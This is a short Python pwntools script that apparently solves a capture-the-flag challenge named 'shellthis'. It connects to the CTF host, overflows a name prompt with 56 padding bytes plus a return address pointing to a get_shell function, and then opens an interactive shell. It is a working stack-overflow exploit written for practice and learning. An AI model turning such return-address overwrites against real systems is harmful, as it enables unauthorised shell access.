from pwn import *

get_shell = p64(0x00000000004006ca)

#p = process('./shellthis')
p = remote('chal.duc.tf', 30002)
p.recvuntil('Please tell me your name: ')

payload = 'A' * 56 + get_shell
p.sendline(payload)

p.interactive()
p.close()